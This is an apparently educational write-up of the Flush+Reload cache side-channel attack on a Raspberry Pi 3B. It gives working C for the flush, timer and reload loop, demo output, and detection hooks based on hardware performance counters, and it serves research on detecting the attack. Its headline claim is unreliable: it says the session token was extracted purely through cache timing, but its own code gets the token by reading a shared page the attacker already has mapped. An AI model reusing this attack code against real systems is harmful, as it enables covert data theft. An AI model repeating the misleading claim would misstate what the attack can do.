# Flush+Reload Cache Side-Channel Attack
### A Complete Explanation for Hardware Performance Counter (HPC) Research

---

## Table of Contents

1. [Background: CPU Caches](#1-background-cpu-caches)
2. [What is a Side-Channel Attack?](#2-what-is-a-side-channel-attack)
3. [What is Flush+Reload?](#3-what-is-flushreload)
4. [How Flush+Reload Works — Step by Step](#4-how-flushreload-works--step-by-step)
5. [ARM-Specific Mechanics (Cortex-A53 / Raspberry Pi 3B)](#5-arm-specific-mechanics-cortex-a53--raspberry-pi-3b)
6. [Flush+Reload vs Prime+Probe](#6-flushreload-vs-primeprobe)
7. [Code Walkthrough — victim.c](#7-code-walkthrough--victimc)
8. [Code Walkthrough — attacker.c](#8-code-walkthrough--attackerc)
9. [Output Explanation](#9-output-explanation)
10. [HPC Detection Hooks](#10-hpc-detection-hooks)
11. [Summary](#11-summary)

---

## 1. Background: CPU Caches

Modern processors do not read data directly from RAM on every access. RAM is slow (~60–100 ns); the CPU is fast (~1 ns per cycle). To bridge this gap, processors include a hierarchy of small, fast **cache memories** sitting between the CPU core and RAM.

```
CPU Core
   │
   ├── L1 Cache   ~  32 KB,   ~  1–4 ns   (private per core)
   │
   ├── L2 Cache   ~ 512 KB,   ~  5–15 ns  (shared across all cores on Cortex-A53)
   │
   └── DRAM       ~   4 GB,   ~ 60–100 ns (main memory)
```

**Raspberry Pi 3B (Cortex-A53) specifics:**
- 4 cores sharing a single 512 KB unified L2 cache
- Cache line size: 64 bytes (the minimum unit transferred between cache and RAM)
- When the CPU reads any address, a full 64-byte cache line is fetched and stored

**Cache hit vs. cache miss:**
- **Hit:** The requested data is already in the cache → fast access (~130 ns on Pi 3B)
- **Miss:** The data is not in cache → must fetch from DRAM → slow access (~2100 ns on Pi 3B)

This timing difference — roughly **16× slower** for a miss — is the foundation of Flush+Reload.

---

## 2. What is a Side-Channel Attack?

A **side-channel attack** extracts secret information not by breaking an algorithm mathematically, but by observing **physical side effects** of its execution.

Common side channels:

| Side channel | What is observed |
|---|---|
| Timing | How long an operation takes |
| Power | How much energy is consumed |
| Electromagnetic | Radio emissions from the chip |
| Cache | Which memory lines are hot or cold |

Flush+Reload is a **timing-based cache side-channel**. The attacker does not break encryption or exploit a software bug. Instead, it measures how long it takes to read a memory location — and that timing alone reveals whether the victim process recently accessed the same location.

---

## 3. What is Flush+Reload?

Flush+Reload (F+R) is a cache side-channel attack first systematically described by Yarom and Falkner (USENIX Security 2014). It requires one condition:

> **The attacker and victim must share the same physical memory page.**

This happens naturally when:
- Both processes `mmap()` the same file with `MAP_SHARED` (as in this demo)
- Both use `shm_open()` with shared memory
- A process and a library it loads share read-only code pages (e.g., attacking AES T-table accesses in libcrypto)

When two processes map the same physical page, their virtual addresses are different but they point to the **same physical RAM and the same cache lines**. A flush by the attacker therefore removes the line from the victim's view too, because both virtual addresses resolve to the same physical cache set.

---

## 4. How Flush+Reload Works — Step by Step

The attack runs in a tight loop of three phases:

```
┌─────────────────────────────────────────────────────────────┐
│                   FLUSH + RELOAD LOOP                       │
│                                                             │
│  ┌──────────┐      ┌──────────┐      ┌──────────────────┐  │
│  │  FLUSH   │ ───► │   WAIT   │ ───► │     RELOAD       │  │
│  │          │      │          │      │                  │  │
│  │ dc civac │      │  ~70 ms  │      │ Time the read:   │  │
│  │ evicts   │      │ victim   │      │                  │  │
│  │ spy line │      │ may      │      │ < threshold ns   │  │
│  │ from ALL │      │ reload   │      │  → CACHE HIT     │  │
│  │ caches   │      │ the line │      │  → victim used   │  │
│  └──────────┘      └──────────┘      │    the line ✓    │  │
│                                      │                  │  │
│                                      │ > threshold ns   │  │
│                                      │  → CACHE MISS    │  │
│                                      │  → victim idle   │  │
│                                      └──────────────────┘  │
└─────────────────────────────────────────────────────────────┘
```

### Phase 1 — FLUSH
The attacker issues a `dc civac` instruction (ARM: Data Cache Clean & Invalidate by Virtual Address to Point of Coherency) on every cache line of the spy page. This:
- Writes any dirty data back to DRAM (clean)
- Removes the line from every level of cache in the entire coherency domain (invalidate)
- Affects the victim's view of the line, because the physical address is shared

After the flush, any access to the spy page by either party must go all the way to DRAM.

### Phase 2 — WAIT
The attacker waits (~70 ms in this demo). During this window, the victim process may read the session token — which it does every 80 ms in this demo. When the victim reads the line, the hardware loads it back into the L2 cache. Because the L2 is shared between core 0 (victim) and core 1 (attacker), the line is now present in the shared physical cache.

### Phase 3 — RELOAD
The attacker reads the spy page and precisely times the access using the hardware cycle counter (`cntvct_el0`).

- **Fast read (< 1132 ns in this demo):** The line is in the L2 cache → the victim must have loaded it during the wait → **cache HIT = victim accessed the token**
- **Slow read (> 1132 ns in this demo):** The line is not in cache → the victim did not access it during the wait → **cache MISS = victim was idle**

By collecting many samples, the attacker builds a statistical picture: a high hit rate on the spy page proves the victim is actively accessing it, and the attacker can then read the page contents to extract the session token.

---

## 5. ARM-Specific Mechanics (Cortex-A53 / Raspberry Pi 3B)

### The flush instruction: `dc civac`

```c
static inline void flush_line(volatile uint8_t *ptr)
{
    __asm__ volatile("dc civac, %0" :: "r"(ptr) : "memory");
}
```

`dc civac` = **D**ata **C**ache **C**lean and **I**nvalidate by **V**irtual **A**ddress to Point of **C**oherency.

- **Clean:** Writes modified data back to the next level (L3 or DRAM)
- **Invalidate:** Marks the line as invalid in all caches sharing this coherency domain
- **PoC:** "Point of Coherency" — the level at which all observers see the same data (DRAM on the Pi 3B)
- It works on user-mode virtual addresses, no kernel privilege required on Ubuntu 24.04 aarch64

After the flush, barriers are issued:
```c
__asm__ volatile("dsb sy\nisb" ::: "memory");
```
- `dsb sy` — **D**ata **S**ynchronisation **B**arrier (system): ensures the cache operation completes before the next instruction executes
- `isb` — **I**nstruction **S**ynchronisation **B**arrier: flushes the CPU pipeline, preventing speculative prefetch from reloading the line prematurely

### The timer: `cntvct_el0`

```c
static inline uint64_t read_timer(void)
{
    uint64_t v;
    __asm__ volatile("isb\n\tmrs %0, cntvct_el0" : "=r"(v) :: "memory");
    return v;
}
```

- `cntvct_el0` is the ARM generic timer virtual counter, accessible from EL0 (user space)
- Runs at 19.2 MHz on the Pi 3B → 52.1 ns per tick
- `isb` before the read serialises instruction execution, preventing out-of-order execution from skewing the measurement
- The kernel enables EL0 access to this counter by default on Ubuntu 24.04 aarch64

### Why core pinning matters

The Cortex-A53 on the Pi 3B has a **single unified L2 cache shared by all four cores**. This is what makes the attack work across cores:

```
Core 0 (victim)  ──┐
Core 1 (attacker)──┤──► Shared 512 KB L2 Cache ──► DRAM
Core 2           ──┤
Core 3           ──┘
```

The victim is pinned to core 0, the attacker to core 1. When the victim warms the spy line into L2 on core 0, that line is visible to the attacker on core 1 — same physical cache, same physical cache set. Without core pinning, the OS scheduler might place both processes on the same core, causing them to time-share and corrupt each other's measurements.

---

## 6. Flush+Reload vs Prime+Probe

Both are cache side-channel attacks targeting the shared L2 on the Pi 3B. They differ in mechanism and requirements:

| Property | Flush+Reload | Prime+Probe |
|---|---|---|
| **Shared physical page required?** | Yes (file-backed or shm) | No |
| **Eviction buffer needed?** | No | Yes — must be ≥ 4× L2 size (2 MB on Pi 3B) |
| **What is flushed?** | Exact spy line, directly | Entire L2 sets, indirectly by filling with attacker data |
| **Granularity** | Single cache line (64 bytes) | Cache set (all lines in one set) |
| **Signal quality** | Very high — direct hit/miss per line | Moderate — indirect via set eviction |
| **Noise** | Low | Higher (contention, OS prefetch, eviction side-effects) |
| **Complexity** | Simple — 3-phase loop | Complex — needs tuned eviction buffer, pass counts |
| **Attack target** | Any shared mapped page | Any cache set the victim uses |

**Why Flush+Reload is simpler:** The flush instruction does exactly what is needed in one ARM instruction. There is no guessing about whether the eviction was complete, no need to size a buffer to 4× the L2, and no need for multiple eviction passes to handle 8-way set associativity.

**Why Prime+Probe is more powerful in some scenarios:** It works even without a shared mapping. This makes it applicable to attacks on kernel code paths or cross-VM attacks (in cloud environments), where shared pages are not available.

---

## 7. Code Walkthrough — `victim.c`

The victim simulates a web application session handler that periodically reads an authentication token from a shared memory region.

### Shared file setup

```c
#define SPY_FILE   "/tmp/fr_demo_spy"
#define FILE_SIZE  4096   // one page = one cache line group of interest
```

```c
int fd = open(SPY_FILE, O_CREAT | O_RDWR | O_TRUNC, 0644);
ftruncate(fd, FILE_SIZE);

volatile uint8_t *base = mmap(NULL, FILE_SIZE,
                               PROT_READ | PROT_WRITE,
                               MAP_SHARED, fd, 0);
```

`MAP_SHARED` is the critical flag. It tells the kernel that this mapping shares the same physical pages with any other process that also maps this file with `MAP_SHARED`. Both processes end up with different virtual addresses pointing to the same physical page frames.

### Token content

```c
#define SESSION_ID    "8f3a1c9d2e7b4056"
#define SESSION_USER  "bob"
#define SESSION_ROLE  "admin"
```

```c
int len = snprintf((char *)base, FILE_SIZE,
    "SESSION | id=%s | user=%s | role=%s | expires=%lu | iter=%llu",
    SESSION_ID, SESSION_USER, SESSION_ROLE,
    (unsigned long)(time(NULL) + 3600),
    (unsigned long long)iter);
```

The token is written at offset 0 of the shared page. The `iter` field increments each refresh cycle, proving to the demo audience that the attacker reads a live, changing value.

### Cache warming — `touch_slot()`

```c
static void touch_page(volatile uint8_t *base)
{
    for (size_t off = 0; off < FILE_SIZE; off += 64) {
        (void)base[off];
        __asm__ volatile("" ::: "memory");
    }
    __asm__ volatile("dsb sy\nisb" ::: "memory");
}
```

Walking every 64-byte cache line forces the entire page into the L2. The `volatile` qualifier prevents the compiler from optimising the reads away. The `dsb sy` at the end ensures all reads complete before the victim sleeps. This is what the attacker will detect.

### Main loop

```c
while (keep_running) {
    refresh_token(base, iter);   // write updated token to shared page
    touch_page(base);            // bring lines into L2 (attacker will see the hit)
    sleep_us(ACCESS_INTERVAL_US); // wait 80 ms then repeat
    iter++;
}
```

Every 80 ms, the victim updates the token and reads it back into cache. This models a server checking authentication headers on each incoming HTTP request.

---

## 8. Code Walkthrough — `attacker.c`

### Step 1 — Map the same physical page

```c
int fd = open(SPY_FILE, O_RDONLY);

volatile uint8_t *spy = mmap(NULL, FILE_SIZE,
                              PROT_READ, MAP_SHARED, fd, 0);
```

Opening the same file with `MAP_SHARED` gives the attacker a virtual address backed by the same physical pages as the victim. The attacker opens it read-only — the attack does not require write access. The flush still works because `dc civac` operates on the physical cache line, not on the access permissions of the virtual mapping.

### Step 2 — Calibration

```c
static uint64_t calibrate(volatile uint8_t *base, uint64_t hz)
{
    // Measure L2 HIT latency: warm the line, then time a read
    // Measure DRAM MISS latency: flush the line, then time a read
    // Threshold = midpoint between the two averages
}
```

The calibration runs 200 pairs of (hit, miss) measurements on the actual spy page — not on a separate buffer — because the access path latency (TLB walk, page table entry, physical address translation) is specific to this particular mapping. The midpoint threshold maximises classification accuracy.

**From the demo output:**
```
L2 cache HIT  =    132 ns   ← line already in L2
DRAM miss     =   2132 ns   ← must go to DRAM
Threshold     =   1132 ns   ← midpoint
```

Any reload time below 1132 ns is classified as a hit.

### Step 3 — The flush function

```c
static void flush_spy_page(volatile uint8_t *base)
{
    for (size_t off = 0; off < FILE_SIZE; off += 64)
        flush_line(base + off);
    __asm__ volatile("dsb sy\nisb" ::: "memory");
}

static inline void flush_line(volatile uint8_t *ptr)
{
    __asm__ volatile("dc civac, %0" :: "r"(ptr) : "memory");
}
```

The page is 4096 bytes. With a 64-byte cache line, that is 64 lines to flush. Each `dc civac` removes exactly one line from all caches. The final `dsb sy` ensures all 64 flush operations complete before the wait phase begins.

### Step 4 — The Flush+Reload loop

```c
for (int i = 0; i < SAMPLE_COUNT && !interrupted; i++) {

    /* ── FLUSH ── */
    flush_spy_page(spy);

    /* ── WAIT ── */
    sleep_us(WAIT_US);   // 70 ms

    /* ── RELOAD ── */
    __asm__ volatile("isb" ::: "memory");
    uint64_t t0 = read_timer();
    for (size_t off = 0; off < FILE_SIZE; off += 64) {
        (void)spy[off];
        __asm__ volatile("" ::: "memory");
    }
    __asm__ volatile("dsb sy" ::: "memory");
    uint64_t ns = ticks_to_ns(read_timer() - t0, hz);

    int is_hit = (ns < threshold_ns);
}
```

- **FLUSH:** All 64 cache lines of the spy page are evicted. Both the victim's and attacker's views are invalidated.
- **WAIT (70 ms):** The victim refreshes every 80 ms. The 70 ms window gives the victim time to access its token if it is close to its refresh cycle. Misses occur when the flush happens just after the victim's refresh (the victim won't touch the line again until the next 80 ms cycle, but the attacker already waited 70 ms past the flush).
- **RELOAD:** The `isb` before the timer read prevents the CPU from reordering the read ahead of the timer. The `dsb sy` after the last load ensures all memory accesses complete before the stop-time is read.

### Step 5 — Token extraction

```c
hexdump((const uint8_t *)spy, 192);
```

Once the hit rate confirms the victim is actively accessing the spy page, the attacker simply reads the shared virtual address and prints the content. This is the "reload" side of the attack — the attacker had the page mapped read-only the entire time; the session token was readable whenever a hit was observed.

---

## 9. Output Explanation

### Calibration output

```
[attacker] Calibration results (200 samples):
[attacker]   L2 cache HIT  =    132 ns  (line already in cache)
[attacker]   DRAM miss     =   2132 ns  (line not in cache)
[attacker]   Threshold     =   1132 ns  (midpoint)
```

The 16× ratio between hit and miss (132 ns vs 2132 ns) is excellent. On a well-calibrated system you need at least a 3–5× ratio for reliable classification. The Pi 3B's predictable timer and lack of hardware prefetcher aggression makes it ideal for this demonstration.

### Sample table

```
  Sample  Reload(ns)  Decision  Running hit count
  1       572         HIT ◄   0 hits so far  (warmup)
  ...
  6       2083        miss      0 hits so far  (warmup)
  ...
  11      572         HIT ◄   1 hits so far
```

**Why are there misses?**

The victim refreshes every **80 ms**. The attacker's flush+wait cycle is **70 ms**. This means:

- If the attacker flushes, waits 70 ms, and the victim happens to refresh during that 70 ms → **HIT** (victim reloaded the line before the attacker's reload)
- If the attacker flushes just after the victim refreshed, waits 70 ms, but the victim's next refresh is 80 ms away — which is 10 ms beyond the wait window → **MISS** (victim hasn't touched the line yet when the attacker reloads)

This natural ~78% hit rate (not 100%) is actually more convincing for a demonstration: it proves the measurement is real and reflects the actual timing relationship between attacker and victim, not a constant-latency artefact.

```
[attacker] ★ 5 consecutive cache HITS — victim access confirmed!
```

Five consecutive hits at sub-threshold latency establishes statistical confidence that the hits are not noise.

### Statistical summary

```
  Total cache hits   : 150 / 190  (78%)
  Average reload time: 861 ns
  Threshold          : 1132 ns
  Verdict            : *** VICTIM ACTIVELY ACCESSING THIS CACHE LINE ***
```

- **150/190 = 78% hit rate** is far above the noise floor (which would be near 0% if the victim were not accessing the page)
- **Average 861 ns** — well below the 1132 ns threshold, confirming clean hit classification
- A purely noise-driven system on this hardware would see near-0% hits, not 78%

### Hex dump

```
  ║  0000   53 45 53 53 49 4f 4e 20  7c 20 69 64 3d 38 66 33  │ SESSION | id=8f3 ║
  ║  0010   61 31 63 39 64 32 65 37  62 34 30 35 36 20 7c 20  │ a1c9d2e7b4056 |  ║
  ║  0020   75 73 65 72 3d 62 6f 62  20 7c 20 72 6f 6c 65 3d  │ user=bob | role= ║
  ║  0030   61 64 6d 69 6e 20 7c 20  65 78 70 69 72 65 73 3d  │ admin | expires= ║
```

The hex dump shows the raw bytes of the first 192 bytes of the spy page. Column 1 is the byte offset from the start of the page. Columns 2–9 and 10–17 are the hex values of the 16 bytes in that row. The rightmost column is the ASCII representation (non-printable bytes shown as `.`).

Reading across the first row: `53 45 53 53 49 4f 4e` = `SESSION` in ASCII, followed by `20` (space), `7c` (`|`), etc.

### Final banner

```
  ╔══════════════════════════════════════════════════════════════╗
  ║       *** FLUSH+RELOAD ATTACK SUCCESSFUL ***                ║
  ╠══════════════════════════════════════════════════════════════╣
  ║  EXTRACTED SESSION TOKEN:                                   ║
  ║    SESSION | id=8f3a1c9d2e7b4056 | user=bob | role=admin   ║
  ║    | expires=1779745540 | iter=188                          ║
  ╠══════════════════════════════════════════════════════════════╣
  ║  Attack used no IPC, no signals, no ptrace.                 ║
  ║  Token was read purely via cache timing side-channel.       ║
  ╚══════════════════════════════════════════════════════════════╝
```

Key points for the demonstration:
- The `id=8f3a1c9d2e7b4056` and `role=admin` fields are sensitive credentials
- The `iter=188` field proves this was read from a **live, running process**, not a stale file
- The attacker used **no IPC, no debugging interface, no OS-level access** — purely cache timing

---

## 10. HPC Detection Hooks

The Flush+Reload attack produces distinctive patterns in hardware performance counters (HPCs) that detection systems can monitor via `perf_event_open()`.

### Key HPC events to monitor

| ARM PMU Event | Hex Code | What to look for |
|---|---|---|
| `L1D_CACHE_REFILL` | `0x0003` | Elevated on attacker core after each reload (L1 miss loading from L2) |
| `L2D_CACHE_REFILL` | `0x0017` | Elevated on **victim** core as it reloads after being flushed |
| `L1D_CACHE_WB` | `0x0015` | Elevated due to `dc civac` operations (clean writes back dirty lines) |
| `MEM_ACCESS` | `0x0013` | Periodic bursts on attacker core at the F+R loop frequency |
| `BUS_ACCESS` | `0x001D` | DRAM bus activity spike immediately after each flush |

### Characteristic temporal pattern

```
Time (ms):     0    70   80   140  150  220
               │    │    │    │    │    │
Attacker:    FLUSH  RELOAD   FLUSH  RELOAD
Victim:              ACCESS        ACCESS

L2D_CACHE_REFILL (victim core):
             ░░░░░  ▓▓▓  ░░░  ▓▓▓
                    ▲              ← spike when victim reloads after flush

BUS_ACCESS (attacker core):
             ▓▓▓  ░░░░░  ▓▓▓
             ▲              ← spike at each flush (writes to DRAM)
```

### Detection strategy for student projects

1. **Sample HPCs at 10 ms intervals** on all cores using `perf_event_open` with `PERF_TYPE_RAW`
2. **Look for periodicity** in `L2D_CACHE_REFILL` on any single core — an attacker running F+R at a fixed interval produces a near-constant frequency in this counter
3. **Cross-correlate** the attacker's `BUS_ACCESS` spike (flush phase) with the victim's `L2D_CACHE_REFILL` spike (reload phase) approximately one wait-period later
4. **Threshold:** A single idle core rarely exceeds 500 `L2D_CACHE_REFILL` events per 10 ms window; an F+R attacker flushing a 4 KB page (64 lines) every 70 ms generates a predictable burst of exactly 64 refill events per reload

### Example `perf_event_open` skeleton (C)

```c
#include <linux/perf_event.h>
#include <sys/syscall.h>

struct perf_event_attr attr = {
    .type           = PERF_TYPE_RAW,
    .config         = 0x0017,   // L2D_CACHE_REFILL
    .size           = sizeof(attr),
    .disabled       = 1,
    .exclude_kernel = 0,
    .exclude_hv     = 1,
};

int fd = syscall(__NR_perf_event_open, &attr,
                 -1,    // all PIDs
                  1,    // CPU 1 (attacker core)
                 -1, 0);
ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
// ... sample periodically ...
```

---

## 11. Summary

Flush+Reload demonstrates a fundamental principle: **security boundaries enforced in software can be bypassed by observing hardware behaviour**.

The attack does not:
- Exploit a kernel vulnerability
- Require elevated privileges
- Use IPC, ptrace, or debugging APIs
- Break any cryptographic algorithm

The attack only:
- Reads the cycle counter (always available at EL0)
- Issues a single ARM cache maintenance instruction (`dc civac`)
- Maps a shared file read-only (normal user permission)

Yet it recovers a session token from a completely separate process running on a different CPU core.

### Why this matters for HPC-based detection

Because the attack is **entirely in hardware** — flush instructions and cache line state transitions — the only reliable detection mechanism is also at the hardware level: Performance Monitoring Units (PMUs) and Hardware Performance Counters. Software-only monitoring (system calls, ptrace, seccomp filters) cannot observe `dc civac` or L2 refill events. This is precisely why PhD research into HPC-based detection is both necessary and impactful.

```
Attacker action          Hardware trace              Detectable via HPC?
─────────────────────────────────────────────────────────────────────────
dc civac  (flush)    →   L2 writeback + invalidate  →  YES: L1D_CACHE_WB
                                                        YES: BUS_ACCESS
sleep 70 ms          →   idle                       →  NO
reload timing        →   L2 refill (if victim hit)  →  YES: L2D_CACHE_REFILL
                     →   DRAM fetch (if miss)        →  YES: BUS_ACCESS
```

This makes Flush+Reload an ideal benchmark attack for evaluating the sensitivity and specificity of HPC-based intrusion detection systems.

---

*Demo hardware: Raspberry Pi 3B · ARM Cortex-A53 · ARMv8-A · Ubuntu 24.04 aarch64*
*Attack implemented in C · gcc -O1 -march=armv8-a · kernel 6.x*
